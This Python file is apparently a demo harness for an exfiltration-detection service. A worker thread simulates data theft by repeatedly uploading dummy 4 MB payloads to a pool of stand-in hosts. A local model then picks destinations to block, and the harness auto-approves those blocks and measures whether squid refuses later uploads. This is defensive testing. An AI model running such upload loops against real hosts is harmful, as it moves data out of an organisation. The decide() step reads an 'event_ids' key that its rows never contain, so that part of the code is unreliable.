"""The recorded run: prime hot, let the agent decide, watch enforcement bite.

Phases, all narrated to stdout and a log file so the run can be tailed live and
killed early if a phase misbehaves:

  0 RESET     clear stored events and every approved rule, reconcile squid
  1 PRIME     routine traffic + sustained attack traffic -> risk climbs
  2 DECIDE    agent reads MCP evidence, LiteLLM picks what to block, files
              findings + recommendations
  3 ENFORCE   same attack traffic continues while approvals land; squid starts
              refusing, and the exfil success rate falls to zero

The measurable claim is phase 3: attack requests keep being attempted at the
same rate, and the ACCEPTED fraction drops. Traffic stopping would prove
nothing — the attacker has to keep trying and keep failing.
"""

from __future__ import annotations

import asyncio
import json
import subprocess
import sys
import threading
import time
import urllib.error
import urllib.request
from dataclasses import dataclass, field
from typing import Any

from . import agent, llm
from .catalog import EXFIL_POOL, ROUTINE, STAGING
from .traffic import _opener, user_pool

INGESTION = "http://127.0.0.1:8100"
PROXY = "http://127.0.0.1:3128"
SYNC = "/home/dell/vllm/squid/sync-denylist.sh"


@dataclass
class Counters:
    normal_ok: int = 0
    attack_attempted: int = 0
    attack_delivered: int = 0
    attack_blocked: int = 0
    lock: threading.Lock = field(default_factory=threading.Lock)

    def snapshot(self) -> dict[str, int]:
        with self.lock:
            return {
                "normal_ok": self.normal_ok,
                "attempted": self.attack_attempted,
                "delivered": self.attack_delivered,
                "blocked": self.attack_blocked,
            }


class Runner:
    def __init__(self, log_path: str, attack_mb: int = 4) -> None:
        self.log = open(log_path, "a", buffering=1)  # noqa: SIM115 - lives for the run
        self.counters = Counters()
        self.stop = threading.Event()
        self.phase = "init"
        self.attack_mb = attack_mb

    # --- output ---------------------------------------------------------

    def say(self, text: str) -> None:
        line = f"[{time.strftime('%H:%M:%S')}] {text}"
        print(line, flush=True)
        self.log.write(line + "\n")

    def beat(self, text: str) -> None:
        self.say("")
        self.say(f"=== {text} ===")

    # --- helpers --------------------------------------------------------

    def events(self) -> int:
        try:
            with urllib.request.urlopen(f"{INGESTION}/v1/events?limit=100000", timeout=20) as r:
                return int(json.load(r).get("count", 0))
        except (OSError, ValueError):
            return -1

    def rules(self) -> list[str]:
        try:
            with urllib.request.urlopen(f"{INGESTION}/v1/rules.txt", timeout=10) as r:
                return [x for x in r.read().decode().split() if x]
        except OSError:
            return []

    def sync_squid(self) -> None:
        subprocess.run([SYNC], capture_output=True, timeout=60, check=False)  # noqa: S603

    # --- traffic --------------------------------------------------------

    def _normal_worker(self, cast: list[str]) -> None:
        import random

        from faker import Faker

        fake = Faker()
        opener = _opener(PROXY)
        while not self.stop.is_set():
            host = random.choice(ROUTINE)  # noqa: S311
            try:
                req = urllib.request.Request(
                    f"http://{host}/api/v1/{fake.uri_path()}",
                    headers={"X-Actor": random.choice(cast)},  # noqa: S311
                )
                with opener.open(req, timeout=10) as resp:
                    resp.read()
                with self.counters.lock:
                    self.counters.normal_ok += 1
            except (urllib.error.URLError, OSError):
                pass
            time.sleep(0.12)

    def _attack_worker(self, actor: str) -> None:
        """Keep exfiltrating, to every pool destination, for the whole run."""
        import random

        opener = _opener(PROXY)
        payload = b"S" * (self.attack_mb * 1024 * 1024)
        while not self.stop.is_set():
            host = random.choice(EXFIL_POOL)  # noqa: S311
            for stage_host, path, _ in STAGING[:2]:
                try:
                    req = urllib.request.Request(
                        f"http://{stage_host}{path}", headers={"X-Actor": actor}
                    )
                    with opener.open(req, timeout=10) as resp:
                        resp.read()
                except (urllib.error.URLError, OSError):
                    pass
            with self.counters.lock:
                self.counters.attack_attempted += 1
            try:
                req = urllib.request.Request(
                    f"http://{host}/upload/chunk.tar.gz",
                    data=payload,
                    method="POST",
                    headers={"X-Actor": actor},
                )
                with opener.open(req, timeout=120) as resp:
                    resp.read()
                with self.counters.lock:
                    self.counters.attack_delivered += 1
            except (urllib.error.HTTPError, urllib.error.URLError, OSError, ConnectionError):
                # 403 arrives mid-stream as a broken pipe; both mean refused.
                with self.counters.lock:
                    self.counters.attack_blocked += 1
            time.sleep(1.0)

    def _progress(self, interval: float) -> None:
        while not self.stop.is_set():
            time.sleep(interval)
            c = self.counters.snapshot()
            rate = f"{100 * c['delivered'] // max(1, c['attempted'])}%" if c["attempted"] else "n/a"
            self.say(
                f"  [{self.phase}] events={self.events()} "
                f"normal={c['normal_ok']} exfil_attempted={c['attempted']} "
                f"delivered={c['delivered']} blocked={c['blocked']} "
                f"success_rate={rate} rules={len(self.rules())}"
            )

    # --- phases ---------------------------------------------------------

    def reset(self) -> None:
        self.beat("PHASE 0 — reset")
        out = subprocess.run(  # noqa: S603
            [
                "docker",
                "exec",
                "hack-ingestion",
                "python3",
                "-c",  # noqa: S607
                # /data/exfilguard.db is where the image actually puts it —
                # the container sets no INGESTION_DB, so guessing the default
                # path failed with "unable to open database" and the run primed
                # on top of stale state. Tables are cleared rather than the file
                # removed, so the live service keeps its open handle.
                "import sqlite3;c=sqlite3.connect('/data/exfilguard.db');"
                "q=\"SELECT name FROM sqlite_master WHERE type='table'\";"
                "t=[r[0] for r in c.execute(q)];"
                "[c.execute(f'DELETE FROM {x}') for x in t];c.commit();"
                "print('cleared '+str(len(t))+' tables')",
            ],
            capture_output=True,
            text=True,
            timeout=60,
            check=False,
        )
        self.say(f"  ingestion store: {out.stdout.strip() or out.stderr.strip()[:120]}")
        self.sync_squid()
        self.say(f"  squid rules after reset: {self.rules() or '(none)'}")
        self.say(f"  events after reset: {self.events()}")

    def prime(self, seconds: float) -> None:
        self.phase = "PRIME"
        self.beat(f"PHASE 1 — prime {seconds:.0f}s: routine traffic + active exfiltration")
        self.say("  attacker uploads to a rotating set of unseen destinations, every second")
        time.sleep(seconds)
        c = self.counters.snapshot()
        self.say(f"  primed: {c['attempted']} exfil attempts, {c['delivered']} delivered")

    def decide(self) -> list[dict[str, Any]]:
        self.phase = "DECIDE"
        self.beat("PHASE 2 — the agent investigates and the model decides")

        events = agent.fetch_events(limit=5000)
        by_dest: dict[str, dict[str, Any]] = {}
        for e in events:
            dest = (e.get("destination") or "").split(":")[0]
            if not dest:
                continue
            row = by_dest.setdefault(
                dest,
                {"destination": dest, "bytes_up": 0, "requests": 0, "has_history": dest in ROUTINE},
            )
            row["bytes_up"] += int(e.get("req_bytes") or 0)
            row["requests"] += 1
        candidates = sorted(by_dest.values(), key=lambda r: -r["bytes_up"])[:8]
        evidence = {c["destination"]: c["event_ids"] for c in candidates}
        self.say(f"  evidence: {len(events)} events across {len(by_dest)} destinations")
        for c in candidates[:5]:
            self.say(
                f"    {c['destination']:42} {c['bytes_up']:>12,} bytes  history={c['has_history']}"
            )

        self.say("  asking the local model via LiteLLM ...")
        started = time.monotonic()
        decisions, source = llm.decide(
            [{k: v for k, v in c.items() if k != "event_ids"} for c in candidates]
        )
        self.say(f"  decision source: {source}  ({time.monotonic() - started:.1f}s)")
        for d in decisions:
            self.say(f"    {d.severity:8} block={str(d.block):5} {d.destination}  {d.reason[:70]}")

        filed = asyncio.run(self._file_decisions(decisions, evidence))
        self.say(f"  filed {len(filed)} recommendation(s) via MCP")
        return filed

    async def _file_decisions(
        self, decisions: list[llm.Decision], evidence: dict[str, list[str]]
    ) -> list[dict[str, Any]]:
        import uuid

        from fastmcp import Client

        filed: list[dict[str, Any]] = []
        blockable = [d for d in decisions if d.block and d.severity in ("critical", "high")]
        async with Client("http://127.0.0.1:8100/mcp/") as client:
            for d in blockable:
                if not evidence.get(d.destination):
                    self.say(f"    skipping {d.destination}: no evidence event ids captured")
                    continue
                fid = f"fnd-{uuid.uuid4().hex[:12]}"
                await client.call_tool(
                    "submit_finding",
                    {
                        "finding_id": fid,
                        "summary": d.reason,
                        "risk_score": 95 if d.severity == "critical" else 80,
                        "severity": d.severity,
                        "event_ids": [],
                    },
                )
                res = await client.call_tool(
                    "recommend_policy",
                    {
                        "finding_id": fid,
                        "action_type": "deny_destination",
                        "target": d.destination,
                        "scope": "destination",
                        "reason": d.reason,
                    },
                )
                filed.append(
                    {
                        "destination": d.destination,
                        "recommendation_id": res.data.get("recommendation_id"),
                        "severity": d.severity,
                    }
                )
        return filed

    def enforce(self, seconds: float, auto_approve: bool) -> None:
        self.phase = "ENFORCE"
        self.beat(f"PHASE 3 — approvals land, traffic continues for {seconds:.0f}s")
        if auto_approve:
            approved = self._approve_all()
            self.say(f"  auto-approved {approved} recommendation(s)")
        self.sync_squid()
        self.say(f"  squid now denying: {self.rules() or '(none)'}")
        baseline = self.counters.snapshot()
        time.sleep(seconds)
        after = self.counters.snapshot()
        attempted = after["attempted"] - baseline["attempted"]
        delivered = after["delivered"] - baseline["delivered"]
        self.say("")
        self.say(
            f"  since enforcement: {attempted} exfil attempts, {delivered} delivered "
            f"({100 * delivered // max(1, attempted)}% success)"
        )

    def _approve_all(self) -> int:
        try:
            with urllib.request.urlopen(
                f"{INGESTION}/v1/recommendations?status=pending", timeout=20
            ) as r:
                pending = json.load(r).get("recommendations", [])
        except (OSError, ValueError):
            return 0

        stamp = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
        approved = 0
        for rec in pending:
            rid = rec.get("recommendation_id")
            body = json.dumps(
                {
                    "schema_version": "1.0",
                    "recommendation_id": rid,
                    "decision": "approved",
                    "analyst": "auto-approve@demo",
                    "timestamp": stamp,
                }
            ).encode()
            req = urllib.request.Request(
                f"{INGESTION}/v1/recommendations/{rid}/decision",
                data=body,
                headers={"Content-Type": "application/json"},
                method="POST",
            )
            try:
                with urllib.request.urlopen(req, timeout=20):  # noqa: S310
                    approved += 1
            except (urllib.error.URLError, OSError):
                pass
        return approved

    # --- driver ---------------------------------------------------------

    def go(self, prime_s: float, enforce_s: float, progress_s: float, auto_approve: bool) -> int:
        self.reset()
        cast = user_pool(30)
        threads = [
            threading.Thread(target=self._normal_worker, args=(cast,), daemon=True)
            for _ in range(4)
        ]
        threads.append(
            threading.Thread(target=self._attack_worker, args=("m.reeves",), daemon=True)
        )
        threads.append(threading.Thread(target=self._progress, args=(progress_s,), daemon=True))
        for t in threads:
            t.start()

        try:
            self.prime(prime_s)
            self.decide()
            self.enforce(enforce_s, auto_approve)
        finally:
            self.stop.set()
            time.sleep(1.5)

        c = self.counters.snapshot()
        self.beat("RESULT")
        self.say(f"  events stored        : {self.events()}")
        self.say(f"  destinations denied  : {self.rules() or '(none)'}")
        self.say(f"  exfil attempts       : {c['attempted']}")
        self.say(f"  delivered / blocked  : {c['delivered']} / {c['blocked']}")
        self.log.close()
        return 0 if c["blocked"] else 1


def main(
    prime_s: float,
    enforce_s: float,
    progress_s: float,
    auto_approve: bool,
    log_path: str,
    attack_mb: int,
) -> int:
    runner = Runner(log_path, attack_mb=attack_mb)
    try:
        return runner.go(prime_s, enforce_s, progress_s, auto_approve)
    except KeyboardInterrupt:
        runner.stop.set()
        runner.say("interrupted")
        return 130


if __name__ == "__main__":
    sys.exit(main(60, 90, 5, True, "/tmp/demo-run.log", 4))
